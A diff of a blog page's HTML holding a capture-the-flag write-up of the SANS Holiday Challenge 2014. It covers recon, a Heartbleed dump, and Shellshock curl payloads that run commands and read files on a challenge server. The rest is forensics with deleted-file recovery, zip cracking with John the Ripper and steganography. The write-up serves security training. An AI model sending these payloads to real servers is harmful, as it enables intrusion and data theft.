@@ -1,237 +1,27 @@
-<!DOCTYPE html>
-<html lang="en-us">
-
-<head>
-
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-
-  
-  <meta property="og:title" content="SANS Holiday Challenge 2014 - Writeup" />
-  <meta property="twitter:title" content="SANS Holiday Challenge 2014 - Writeup" />
-  
-  <meta property="og:site_name" content="Jordan Wright" />
-  <meta property="og:url" content="https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/" />
-  <meta property="twitter:url" content="https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/">
-
-
-  
-  <meta property="og:type" content="article" />
-
-  <meta property="og:article:published_time" content="2015-01-05T00:00:00Z" />
-
-  
-
-  
-  <meta name="description" content="Security and Programming Blog" />
-  
-
-  
-
-  
-
-  <title>
-     SANS Holiday Challenge 2014 - Writeup 
-  </title>
-
-
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <link rel="shortcut icon" href="https://jordan-wright.com/blog/images/favicon.ico">
-  <link rel="apple-touch-icon" href="https://jordan-wright.com/blog/images/apple-touch-icon.png" />
-
-  <link rel="stylesheet" type="text/css" href="/blog/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/blog/css/highlight.css" />
-  <link rel="stylesheet" type="text/css" href="https://jordan-wright.com/blog/css/nav.css" />
-  <link rel="stylesheet" type="text/css"
-    href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata" />
-
-
-  
-  
-  <link href="https://jordan-wright.com/blog/index.xml" rel="alternate" type="application/rss+xml" title="Jordan Wright" />
-  
-  
-  
-  <meta name="generator" content="Hugo 0.40.3" />
-
-  <link rel="canonical" href="https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/" />
-
-  
-  <script>
-    (function (i, s, o, g, r, a, m) {
-      i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
-        (i[r].q = i[r].q || []).push(arguments)
-      }, i[r].l = 1 * new Date(); a = s.createElement(o),
-        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
-
-    ga('create', 'UA-44718701-1', 'auto');
-    ga('send', 'pageview');
-
-  </script>
-  
-
-  
-</head>
-
-<body class="nav-closed">
-
-  <div class="nav">
-    <h3 class="nav-title">Menu</h3>
-    <a href="#" class="nav-close">
-        <span class="hidden">Close</span>
-    </a>
-    <ul>
-        
-        
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/">Home</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/contact/">Contact</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/projects/">Projects</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/blog/">Blog</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://raidersec.blogspot.com">Raidersec</a>
-            </li>
-        
-    </ul>
-    
-    
-    <a class="subscribe-button icon-feed" href="https://jordan-wright.com/blog/index.xml">Subscribe</a>
-    
-</div>
-<span class="nav-cover"></span>
-
-
-  <div class="site-wrapper">
-
-
-
-
-<header class="main-header post-head no-cover">
-  <nav class="main-nav clearfix">
-
-
-  
-      <a class="menu-button" href="#"><span class="burger">&#9776;</span><span class="word">Menu</span></a>
-  
-  </nav>
-</header>
-
-
-
-<main class="content" role="main">
-
-
-
-
-  <article class="post post">
-
-    <header class="post-header">
-        <h1 class="post-title">SANS Holiday Challenge 2014 - Writeup</h1>
-        <small></small>
-
-        <section class="post-meta">
-        
-          <time class="post-date" datetime="2015-01-05T00:00:00Z">
-            Jan 5, 2015
-          </time>
-        
-         
-        </section>
-    </header>
-
-    <section class="post-content">
-      <img src="/blog/images/headers/sans_holiday_2014.png" alt="" class="pure-img" >
-
-
-<h3 id="introduction">Introduction</h3>
-
-<p>Back in December, SANS <a href="pen-testing.sans.org/holiday-challenge/2014">released</a> another installment of their annual holiday challenge. I enjoyed <a href="http://raidersec.blogspot.com/search/label/SANS">taking on the 2012 challenge</a>, so I was excited to see what SANS had in store this year. This year&rsquo;s challenge didn&rsquo;t disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required &ldquo;secret&rdquo; to solve the challenge.</p>
-
-<p><em>I&rsquo;d like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.</em>
-</p>
-
-<h3 id="ghost-of-hacking-past">Ghost of Hacking Past</h3>
-
-<p>Let&rsquo;s start with a basic nmap:</p>
-
-<pre><code>root@jordan:~# nmap -v -A -n -Pn -p 1-65535 173.255.233.59
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta property="og:title" content="SANS Holiday Challenge 2014 - Writeup &#183; Jordan Wright"><meta property="og:site_name" content="Jordan Wright"><meta property="og:url" content="https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2015-01-05T00:00:00Z"><title>SANS Holiday Challenge 2014 - Writeup &#183; Jordan Wright</title><meta name=description content="Security and Programming Blog"><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://jordan-wright.com/blog/images/favicon.ico><link rel=apple-touch-icon href=https://jordan-wright.com/blog/images/apple-touch-icon.png><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/screen.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/highlight.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/nav.css><link rel=stylesheet type=text/css href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata"><link href=https://jordan-wright.com/blog/index.xml rel=alternate type=application/rss+xml title="Jordan Wright"><meta name=generator content="Hugo 0.154.5"><link rel=canonical href=https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-44718701-1","auto"),ga("send","pageview")</script></head><body class=nav-closed><div class=nav><h3 class=nav-title>Menu</h3><a href=# class=nav-close><span class=hidden>Close</span></a><ul><li class=nav-opened role=presentation><a href=https://jordan-wright.com/>Home</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/contact/>Contact</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/projects/>Projects</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/blog/>Blog</a></li><li class=nav-opened role=presentation><a href=https://raidersec.blogspot.com>Raidersec</a></li></ul><a class="subscribe-button icon-feed" href=https://jordan-wright.com/blog/index.xml>Subscribe</a></div><span class=nav-cover></span><div class=site-wrapper><header class="main-header post-head no-cover"><nav class="main-nav clearfix"><a class=menu-button href=#><span class=burger>&#9776;</span><span class=word>Menu</span></a></nav></header><main class=content role=main><article class="post post"><header class=post-header><h1 class=post-title>SANS Holiday Challenge 2014 - Writeup</h1><small></small><section class=post-meta><time class=post-date datetime=2015-01-05T00:00:00Z>Jan 5, 2015</time></section></header><section class=post-content><img src=/blog/images/headers/sans_holiday_2014.png alt class=pure-img><h3 id=introduction>Introduction</h3><p>Back in December, SANS <a href=pen-testing.sans.org/holiday-challenge/2014>released</a> another installment of their annual holiday challenge. I enjoyed <a href=http://raidersec.blogspot.com/search/label/SANS>taking on the 2012 challenge</a>, so I was excited to see what SANS had in store this year. This year&rsquo;s challenge didn&rsquo;t disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required &ldquo;secret&rdquo; to solve the challenge.</p><p><em>I&rsquo;d like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.</em></p><h3 id=ghost-of-hacking-past>Ghost of Hacking Past</h3><p>Let&rsquo;s start with a basic nmap:</p><pre tabindex=0><code>root@jordan:~# nmap -v -A -n -Pn -p 1-65535 173.255.233.59
 &lt;snip&gt;
 Discovered open port 22/tcp on 173.255.233.59
 Discovered open port 31124/tcp on 173.255.233.59
 &lt;/snip&gt;
-</code></pre>
-
-<p>The SSH service is locked down and doesn&rsquo;t prove fruitful since the only supported authentication method is via public/private keys. However, if we connect to the service on TCP port 31124 using netcat, we find an implementation of the well-known <a href="http://en.wikipedia.org/wiki/ELIZA">ELIZA program</a>:</p>
-
-<pre><code>root@jordan:~# nc 173.255.233.59 31124
-I AM ELIZA.  WHAT'S ON YOUR MIND?
-</code></pre>
-
-<p>With some trial and error, I found that if we ask for the secret multiple times, we get a hint:</p>
-
-<pre><code>root@jordan:~# nc 173.255.233.59 31124
-I AM ELIZA.  WHAT'S ON YOUR MIND?
+</code></pre><p>The SSH service is locked down and doesn&rsquo;t prove fruitful since the only supported authentication method is via public/private keys. However, if we connect to the service on TCP port 31124 using netcat, we find an implementation of the well-known <a href=http://en.wikipedia.org/wiki/ELIZA>ELIZA program</a>:</p><pre tabindex=0><code>root@jordan:~# nc 173.255.233.59 31124
+I AM ELIZA.  WHAT&#39;S ON YOUR MIND?
+</code></pre><p>With some trial and error, I found that if we ask for the secret multiple times, we get a hint:</p><pre tabindex=0><code>root@jordan:~# nc 173.255.233.59 31124
+I AM ELIZA.  WHAT&#39;S ON YOUR MIND?
 &gt; secret
-A GIRL'S GOTTA KEEP HER SECRETS.  WHY DON'T YOU ASK ME ABOUT SOMETHING ELSE?
+A GIRL&#39;S GOTTA KEEP HER SECRETS.  WHY DON&#39;T YOU ASK ME ABOUT SOMETHING ELSE?
 &gt; secret
 YOU REALLY ARE INTERESTED IN MY SECRET.  I THINK WE SHOULD GET TO KNOW EACH OTHER BETTER FIRST.  TELL ME ABOUT YOUR FAVOURITE WEBSITES.
 &gt; secret
-I AM SO SORRY, BUT I CAN'T TELL YOU MY SECRET VIA THIS DIALOG.  I DO REALLY LIKE YOU, BUT I WORRY THAT SOMEONE MAY BE SHOULDER SURFING YOU.  NO ONE IS SHOULDER SURFING ME, THOUGH, SO WHY DON'T YOU GIVE ME A URL THAT I CAN SURF TO?
-</code></pre>
-
-<p>Looks like we can make Eliza navigate to a URL of our choosing. Let&rsquo;s setup a netcat listener, and then point Eliza to it to see what she does.</p>
-
-<p>Back on our server, we setup the listener:</p>
-
-<pre><code>root@jordan:~# nc -l -p 80
-</code></pre>
-
-<p>Then, we tell Eliza to visit the host</p>
-
-<pre><code>&gt; surf to http://x.x.x.x
+I AM SO SORRY, BUT I CAN&#39;T TELL YOU MY SECRET VIA THIS DIALOG.  I DO REALLY LIKE YOU, BUT I WORRY THAT SOMEONE MAY BE SHOULDER SURFING YOU.  NO ONE IS SHOULDER SURFING ME, THOUGH, SO WHY DON&#39;T YOU GIVE ME A URL THAT I CAN SURF TO?
+</code></pre><p>Looks like we can make Eliza navigate to a URL of our choosing. Let&rsquo;s setup a netcat listener, and then point Eliza to it to see what she does.</p><p>Back on our server, we setup the listener:</p><pre tabindex=0><code>root@jordan:~# nc -l -p 80
+</code></pre><p>Then, we tell Eliza to visit the host</p><pre tabindex=0><code>&gt; surf to http://x.x.x.x
 DOES THIS LOOK LIKE THE CORRECT PAGE?
-</code></pre>
-
-<p>And, back in our netcat session, we see this:</p>
-
-<pre><code>GET / HTTP/1.1
+</code></pre><p>And, back in our netcat session, we see this:</p><pre tabindex=0><code>GET / HTTP/1.1
 Accept-Encoding: identity
 Host: 107.170.44.35
 Connection: close
-User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: &quot;Machines take me by surprise with great frequency. -Alan Turing&quot;
-</code></pre>
-
-<p>Awesome - one down. Let&rsquo;s move on.</p>
-
-<h3 id="ghost-of-hacking-present">Ghost of Hacking Present</h3>
-
-<p>SANS is great at incorporating big vulnerabilities found in the previous year into their holiday challenges. As such, I was hoping there would be a mention to Heartbleed and Shellshock somewhere in their challenges. Sure enough, the Ghost of Hacking Present allowed us to leverage both vulnerabilities to our advantage.</p>
-
-<p>Let&rsquo;s start with the HTTPS service.</p>
-
-<p>Running a <a href="link">Heartbleed POC script</a>, we can see the following dumped from the server:</p>
-
-<pre><code>0180: 01 00 0F 00 01 01 43 25 32 30 69 74 73 25 32 30  ......C%20its%20
+User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: &#34;Machines take me by surprise with great frequency. -Alan Turing&#34;
+</code></pre><p>Awesome - one down. Let&rsquo;s move on.</p><h3 id=ghost-of-hacking-present>Ghost of Hacking Present</h3><p>SANS is great at incorporating big vulnerabilities found in the previous year into their holiday challenges. As such, I was hoping there would be a mention to Heartbleed and Shellshock somewhere in their challenges. Sure enough, the Ghost of Hacking Present allowed us to leverage both vulnerabilities to our advantage.</p><p>Let&rsquo;s start with the HTTPS service.</p><p>Running a <a href=link>Heartbleed POC script</a>, we can see the following dumped from the server:</p><pre tabindex=0><code>0180: 01 00 0F 00 01 01 43 25 32 30 69 74 73 25 32 30  ......C%20its%20
 0190: 66 6F 72 6D 25 32 43 25 32 30 61 6E 64 25 32 30  form%2C%20and%20
 01a0: 6C 65 66 74 25 32 30 6E 6F 74 68 69 6E 67 25 32  left%20nothing%2
 01b0: 30 6F 66 25 32 30 69 74 25 32 30 76 69 73 69 62  0of%20it%20visib
@@ -253,86 +43,25 @@ User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: &quot;Machines take me 
 02b0: 73 69 74 65 25 32 30 53 65 63 72 65 74 25 32 30  site%20Secret%20
 02c0: 25 32 33 31 3D 48 61 63 6B 69 6E 67 25 32 30 63  %231=Hacking%20c
 02d0: 61 6E 25 32 30 62 65 25 32 30 6E 6F 62 6C 65 25  an%20be%20noble%
-</code></pre>
-
-<p>Decoded, this gives us:</p>
-
-<pre><code>its form, and left nothing of it visible save one outstretched hand. But for this it would have been difficult to detach its figure from the night, and separate it from the darkness by which it was surrounded.
+</code></pre><p>Decoded, this gives us:</p><pre tabindex=0><code>its form, and left nothing of it visible save one outstretched hand. But for this it would have been difficult to detach its figure from the night, and separate it from the darkness by which it was surrounded.
 &amp;Website Secret #1=Hacking can be noble
-</code></pre>
-
-<p>Now let&rsquo;s turn our attention to the main HTTP site. Basic recon shows us that a contact page is available at <code>/cgi-bin/submit.sh</code>. The <code>.sh</code> tells us that this is likely a shell script processing the request. This immediately tells us to check for Shellshock. After a little bit of trial and error, we can get the following:</p>
-
-<pre><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &quot;() { :;};echo;pwd;&quot;
+</code></pre><p>Now let&rsquo;s turn our attention to the main HTTP site. Basic recon shows us that a contact page is available at <code>/cgi-bin/submit.sh</code>. The <code>.sh</code> tells us that this is likely a shell script processing the request. This immediately tells us to check for Shellshock. After a little bit of trial and error, we can get the following:</p><pre tabindex=0><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &#34;() { :;};echo;pwd;&#34;
 /var/www/cgi-bin
 Content-Type: text/html
-&lt;html&gt;&lt;head&gt;&lt;style type=&quot;text/css&quot;&gt; body { background-color: #E9DD09; } &lt;/style&gt;&lt;META http-equiv=&quot;refresh&quot; content=&quot;0;URL=http://www.scrooge-and-marley.com/&quot;&gt;&lt;/head&gt;&lt;/html&gt;
-</code></pre>
-
-<p>Great. Now that we can start running commands, let&rsquo;s start exploring the filesystem. We find out pretty quickly that only bash builtin commands are available to us (no <code>cat</code>, <code>ls</code> etc.) - bummer. No problem, we can start by exploring the filesystem via <code>echo /&lt;directory&gt;*</code>.</p>
-
-<pre><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &quot;() { :;};echo; echo /*&quot;
+&lt;html&gt;&lt;head&gt;&lt;style type=&#34;text/css&#34;&gt; body { background-color: #E9DD09; } &lt;/style&gt;&lt;META http-equiv=&#34;refresh&#34; content=&#34;0;URL=http://www.scrooge-and-marley.com/&#34;&gt;&lt;/head&gt;&lt;/html&gt;
+</code></pre><p>Great. Now that we can start running commands, let&rsquo;s start exploring the filesystem. We find out pretty quickly that only bash builtin commands are available to us (no <code>cat</code>, <code>ls</code> etc.) - bummer. No problem, we can start by exploring the filesystem via <code>echo /&lt;directory>*</code>.</p><pre tabindex=0><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &#34;() { :;};echo; echo /*&#34;
 /bin /dev /etc /lib /lib64 /run /sbin /secret /selinux /usr /var
-</code></pre>
-
-<p>Looks like the file is at <code>/secret</code>. We can use a bash read loop to get the contents of it.</p>
-
-<p>*Note: Make sure to escape the <code>$</code>, otherwise the local system will try to replace the variable contents <em>before</em> sending the request.</p>
-
-<pre><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &quot;() { :;};echo;while read line; do echo \$line; done &lt; /secret;&quot;
+</code></pre><p>Looks like the file is at <code>/secret</code>. We can use a bash read loop to get the contents of it.</p><p>*Note: Make sure to escape the <code>$</code>, otherwise the local system will try to replace the variable contents <em>before</em> sending the request.</p><pre tabindex=0><code>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A &#34;() { :;};echo;while read line; do echo \$line; done &lt; /secret;&#34;
 Website Secret #2: Use your skills for good.
-</code></pre>
-
-<p>Easy as that!</p>
-
-<p><em>Fun fact: the <code>/server-status</code> page was accessible on the server, allowing us to essentially watch as requests are being made to the server. Big shout-out to everyone trying to brute force hidden files/directories :)</em></p>
-
-<h3 id="ghost-of-hacking-future">Ghost of Hacking Future</h3>
-
-<p>This one was tougher than the first two - largely because I&rsquo;m not great at filesystem forensics. To follow along, you can download the file <a href="http://pen-testing.sans.org/hhusb.dd.bin">here</a>.</p>
-
-<p>First, we run <code>file</code> to see what kind of file this is:</p>
-
-<pre><code>root@jordan:~# file hhusb.dd.bin
-hhusb.dd.bin: x86 boot sector, code offset 0x52, OEM-ID &quot;NTFS    &quot;, sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 2048, dos &lt; 4.0 BootSector (0x0)
-</code></pre>
-
-<p>Looks like a standard NTFS filesystem. Let&rsquo;s try to mount the image:</p>
-
-<pre><code>root@jordan:~# mount hhusb.dd.bin /mnt -t ntfs
+</code></pre><p>Easy as that!</p><p><em>Fun fact: the <code>/server-status</code> page was accessible on the server, allowing us to essentially watch as requests are being made to the server. Big shout-out to everyone trying to brute force hidden files/directories :)</em></p><h3 id=ghost-of-hacking-future>Ghost of Hacking Future</h3><p>This one was tougher than the first two - largely because I&rsquo;m not great at filesystem forensics. To follow along, you can download the file <a href=http://pen-testing.sans.org/hhusb.dd.bin>here</a>.</p><p>First, we run <code>file</code> to see what kind of file this is:</p><pre tabindex=0><code>root@jordan:~# file hhusb.dd.bin
+hhusb.dd.bin: x86 boot sector, code offset 0x52, OEM-ID &#34;NTFS    &#34;, sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 2048, dos &lt; 4.0 BootSector (0x0)
+</code></pre><p>Looks like a standard NTFS filesystem. Let&rsquo;s try to mount the image:</p><pre tabindex=0><code>root@jordan:~# mount hhusb.dd.bin /mnt -t ntfs
 root@jordan:~# ls /mnt/
 hh2014-chat.pcapng  LetterFromJackToChuck.doc
-</code></pre>
-
-<p>Sweet - we have two files. Opening the .doc doesn&rsquo;t give us much info, but I wonder if there&rsquo;s more to it than meets the eye. I ran <code>strings</code> on the file and found this:</p>
-
-<pre><code>USB Secret #1: Your demise is a source of mirth.
-</code></pre>
-
-<p>Looks like a secret was hidden in the file. Huh. Turns out, this was in one of the document properties, which are viewable using Word.</p>
-
-<p>Now let&rsquo;s go after the PCAP. Looking through the contents of the file, we can see a conversation regarding the death of Scrooge, but no secret. I began to wonder if there was a reason that this was a pcap-<strong>ng</strong> file instead of just a pcap. Turns out, there are additional fields supported by pcap-ng files, one of which is packet comments.</p>
-
-<p>Using Wireshark, we can find any packet comments by filtering for <code>pkt_comment</code>:</p>
-
-<p><img src="/blog/images/blog/sans_2014/pkt_comment.png"/></p>
-
-<p>Sweet! Looks like there are two comments:</p>
-
-<ul>
-<li><code>VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg==</code></li>
-<li><a href="https://code.google.com/p/f5-steganography/">https://code.google.com/p/f5-steganography/</a></li>
-</ul>
-
-<p>The first one is base64 encoded:</p>
-
-<pre><code>root@jordan:~/sans_recovered# echo VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg== | base64 -d
+</code></pre><p>Sweet - we have two files. Opening the .doc doesn&rsquo;t give us much info, but I wonder if there&rsquo;s more to it than meets the eye. I ran <code>strings</code> on the file and found this:</p><pre tabindex=0><code>USB Secret #1: Your demise is a source of mirth.
+</code></pre><p>Looks like a secret was hidden in the file. Huh. Turns out, this was in one of the document properties, which are viewable using Word.</p><p>Now let&rsquo;s go after the PCAP. Looking through the contents of the file, we can see a conversation regarding the death of Scrooge, but no secret. I began to wonder if there was a reason that this was a pcap-<strong>ng</strong> file instead of just a pcap. Turns out, there are additional fields supported by pcap-ng files, one of which is packet comments.</p><p>Using Wireshark, we can find any packet comments by filtering for <code>pkt_comment</code>:</p><img src=/blog/images/blog/sans_2014/pkt_comment.png><p>Sweet! Looks like there are two comments:</p><ul><li><code>VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg==</code></li><li><a href=https://code.google.com/p/f5-steganography/>https://code.google.com/p/f5-steganography/</a></li></ul><p>The first one is base64 encoded:</p><pre tabindex=0><code>root@jordan:~/sans_recovered# echo VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg== | base64 -d
 USB Secret #2: Your demise is a source of relief.
-</code></pre>
-
-<p>The other hint might come in handy later. Ok, two secrets down. But where&rsquo;s #3 and #4? I bet there are more files to be had. Let&rsquo;s use The Sleuth Kit to check for previously deleted files that we can recover:</p>
-
-<pre><code>root@jordan:/mnt# fls ~/hhusb.dd.bin -u
+</code></pre><p>The other hint might come in handy later. Ok, two secrets down. But where&rsquo;s #3 and #4? I bet there are more files to be had. Let&rsquo;s use The Sleuth Kit to check for previously deleted files that we can recover:</p><pre tabindex=0><code>root@jordan:/mnt# fls ~/hhusb.dd.bin -u
 r/r 4-128-4:    $AttrDef
 r/r 8-128-2:    $BadClus
 r/r 8-128-1:    $BadClus:$Bad
@@ -352,44 +81,18 @@ r/r 32-128-5:   hh2014-chat.pcapng:Bed_Curtains.zip
 r/r 33-128-1:   LetterFromJackToChuck.doc
 -/r * 34-128-1: Tiny_Tom_Crutches_Final.jpg
 d/d 256:        $OrphanFiles
-</code></pre>
-
-<p>I see a couple of things that stand out. First off, what&rsquo;s that &ldquo;Bed_Curtains.zip&rdquo; file? Also, it looks like a file called &ldquo;Tiny_Tom_Crutches_Final.jpg&rdquo; was previously deleted (indicated by the <code>*</code>). Let&rsquo;s go ahead and extract all these files into a directory called <code>/sans_recovered</code></p>
-
-<pre><code>root@jordan:~# mkdir sans_recovered
+</code></pre><p>I see a couple of things that stand out. First off, what&rsquo;s that &ldquo;Bed_Curtains.zip&rdquo; file? Also, it looks like a file called &ldquo;Tiny_Tom_Crutches_Final.jpg&rdquo; was previously deleted (indicated by the <code>*</code>). Let&rsquo;s go ahead and extract all these files into a directory called <code>/sans_recovered</code></p><pre tabindex=0><code>root@jordan:~# mkdir sans_recovered
 root@jordan:~# tsk_recover -e -f ntfs ./hhusb.dd.bin ./sans_recovered/
 Files Recovered: 4
 root@jordan:~# cd sans_recovered/
 root@jordan:~/sans_recovered# ls
 $Extend  hh2014-chat.pcapng  LetterFromJackToChuck.doc  Tiny_Tom_Crutches_Final.jpg
-</code></pre>
-
-<p>Where&rsquo;s &ldquo;Bed_Curtains.zip&rdquo;? After asking around, it turns out that this syntax indicates the file is stored as an NTFS alternate data stream. We can extract the file manually using <code>icat</code>.</p>
-
-<pre><code>root@jordan:~# icat hhusb.dd.bin 32-128-5 &gt; sans_recovered/Bed_Curtains.zip
-</code></pre>
-
-<p>Let&rsquo;s unzip it:</p>
-
-<pre><code>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
+</code></pre><p>Where&rsquo;s &ldquo;Bed_Curtains.zip&rdquo;? After asking around, it turns out that this syntax indicates the file is stored as an NTFS alternate data stream. We can extract the file manually using <code>icat</code>.</p><pre tabindex=0><code>root@jordan:~# icat hhusb.dd.bin 32-128-5 &gt; sans_recovered/Bed_Curtains.zip
+</code></pre><p>Let&rsquo;s unzip it:</p><pre tabindex=0><code>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
 Archive:  Bed_Curtains.zip
 [Bed_Curtains.zip] Bed_Curtains.png password:
-</code></pre>
-
-<p>Looks like it&rsquo;s password protected, so what password should we use? At this point, we notice the following hint given by the SANS storyline:</p>
-
-<blockquote>
-<p>Just work with me on this, man. There&rsquo;s something important and even CeWL here for you.</p>
-</blockquote>
-
-<p>This suggests that the tool <a href="http://digi.ninja/projects/cewl.php"><code>CeWL</code></a> would be useful in creating a custom wordlist to break the password. We can run the tool like this:</p>
-
-<pre><code>./cewl.rb -d 3 -w sans_wordlist.txt http://pen-testing.sans.org/holiday-challenge/2014
-</code></pre>
-
-<p>Unfortunately, after trying this as a wordlist for both the SANS URL as well as directly with hackersforcharity.org, I still couldn&rsquo;t find the right password. So, next choice - just use a huge wordlist. We&rsquo;ll crack the password using John the Ripper (ver: 1.7.9-jumbo-7).</p>
-
-<pre><code>root@jordan:~# zip2john sans_recovered/Bed_Curtains.zip &gt; sans_recovered/Bed_Curtains.john
+</code></pre><p>Looks like it&rsquo;s password protected, so what password should we use? At this point, we notice the following hint given by the SANS storyline:</p><blockquote><p>Just work with me on this, man. There&rsquo;s something important and even CeWL here for you.</p></blockquote><p>This suggests that the tool <a href=http://digi.ninja/projects/cewl.php><code>CeWL</code></a> would be useful in creating a custom wordlist to break the password. We can run the tool like this:</p><pre tabindex=0><code>./cewl.rb -d 3 -w sans_wordlist.txt http://pen-testing.sans.org/holiday-challenge/2014
+</code></pre><p>Unfortunately, after trying this as a wordlist for both the SANS URL as well as directly with hackersforcharity.org, I still couldn&rsquo;t find the right password. So, next choice - just use a huge wordlist. We&rsquo;ll crack the password using John the Ripper (ver: 1.7.9-jumbo-7).</p><pre tabindex=0><code>root@jordan:~# zip2john sans_recovered/Bed_Curtains.zip &gt; sans_recovered/Bed_Curtains.john
 root@jordan:~# john --wordlist=wordlists/all  --rules Bed_Curtains.john
 &lt;snip&gt;
 root@jordan:~/sans_recovered# john --show Bed_Curtains.john
@@ -398,11 +101,7 @@ root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
 Archive:  Bed_Curtains.zip
 [Bed_Curtains.zip] Bed_Curtains.png password:
 inflating: Bed_Curtains.png
-</code></pre>
-
-<p>Looks like it worked! Let&rsquo;s take a look at the properties of the extracted image using <code>exiftool</code>.</p>
-
-<pre><code>root@jordan:~# exiftool Bed_Curtains.png
+</code></pre><p>Looks like it worked! Let&rsquo;s take a look at the properties of the extracted image using <code>exiftool</code>.</p><pre tabindex=0><code>root@jordan:~# exiftool Bed_Curtains.png
 File Name                       : Bed_Curtains.png
 Directory                       : .
 File Size                       : 1401 kB
@@ -410,17 +109,9 @@ File Size                       : 1401 kB
 Comment                         : USB Secret #3: Your demise is a source of gain for others.
 Exif Byte Order                 : Big-endian (Motorola, MM)
 &lt;snip&gt;
-</code></pre>
-
-<p>One more to go. Let&rsquo;s look at the Tiny_Tom_crutches.png file to see what we can find. With this being a CTF style challenge, let&rsquo;s check for the presence of steganography. The tool <code>stegdetect</code> is pretty good at this, so let&rsquo;s see what it finds:</p>
-
-<pre><code>root@jordan:~/sans_recovered# stegdetect Tiny_Tom_Crutches_Final.jpg
+</code></pre><p>One more to go. Let&rsquo;s look at the Tiny_Tom_crutches.png file to see what we can find. With this being a CTF style challenge, let&rsquo;s check for the presence of steganography. The tool <code>stegdetect</code> is pretty good at this, so let&rsquo;s see what it finds:</p><pre tabindex=0><code>root@jordan:~/sans_recovered# stegdetect Tiny_Tom_Crutches_Final.jpg
 Tiny_Tom_Crutches_Final.jpg : f5(***)
-</code></pre>
-
-<p>The hint we found pointing to <a href="https://code.google.com/p/f5-steganography/">this project</a> might come in handy. Let&rsquo;s see if we can use it to get the secret:</p>
-
-<pre><code>root@jordan:~/sans_recovered# java -jar f5.jar x -e secret.txt Tiny_Tom_Crutches_Final.jpg
+</code></pre><p>The hint we found pointing to <a href=https://code.google.com/p/f5-steganography/>this project</a> might come in handy. Let&rsquo;s see if we can use it to get the secret:</p><pre tabindex=0><code>root@jordan:~/sans_recovered# java -jar f5.jar x -e secret.txt Tiny_Tom_Crutches_Final.jpg
 Huffman decoding starts
 Permutation starts
 423168 indices shuffled
@@ -431,81 +122,9 @@ root@jordan:~/sans_recovered# cat secret.txt
 Tiny Tom has died.
 
 USB Secret #4: You can prevent much grief and cause much joy. Hack for good, not evil or greed.
-</code></pre>
-
-<p>There it is! All the secrets have been retrieved.</p>
-
-<h3 id="conclusion">Conclusion</h3>
-
